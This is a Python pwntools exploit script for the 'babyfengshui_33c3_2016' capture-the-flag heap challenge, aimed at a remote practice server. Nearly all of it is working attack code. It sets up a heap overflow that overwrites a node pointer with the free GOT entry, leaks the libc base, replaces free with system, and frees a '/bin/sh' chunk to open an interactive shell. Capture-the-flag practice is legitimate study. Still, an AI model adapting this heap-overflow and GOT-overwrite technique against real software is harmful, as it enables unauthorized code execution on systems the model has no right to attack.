from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('babyfengshui_33c3_2016')
io = remote('node4.buuoj.cn', 26474)
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('babyfengshui_33c3_2016')
free_got = elf.got['free']


def add(size1, size2, text):
	io.sendlineafter('Action: ', '0')
	io.sendlineafter('size of description: ', str(size1))
	io.sendlineafter('name: ', 'a')
	io.sendlineafter('text length: ', str(size2))
	io.sendafter('text: ', text)


def delete(index):
	io.sendlineafter('Action: ', '1')
	io.sendlineafter('index: ', str(index))


def show(index):
	io.sendlineafter('Action: ', '2')
	io.sendlineafter('index: ', str(index))


def edit(index, size, text):
	io.sendlineafter('Action: ', '3')
	io.sendlineafter('index: ', str(index))
	io.sendlineafter('text length: ', str(size))
	io.sendafter('text: ', text)


def pwn():
	add(0x70, 0x70, 'b\n')							# user0
	add(0x8, 0x8, 'b\n')							# user1
	add(0x8, 0x8, '/bin/sh\x00')					# user2
	delete(0)
	# unsorted(0x100) user0 desc+node
	# user1 desc(0x11) node(0x88)
	# user2 desc(0x11) node(0x88)
	payload = cyclic(0xf8)							# user3 desc
	payload += p32(0) + p32(0x11) + cyclic(8)		# user1 desc
	payload += p32(0) + p32(0x88) + p32(free_got)	# user1 node
	add(0xf8, 0x114, payload)
	show(1)
	io.recvuntil('description: ')
	libc_base = u32(io.recvn(4)) - libc.symbols['free']
	log.success('libc_base: ' + hex(libc_base))
	
	system = libc_base + libc.symbols['system']
	edit(1, 4, p32(system))
	delete(2)
	io.interactive()

if __name__ == '__main__':
	pwn()

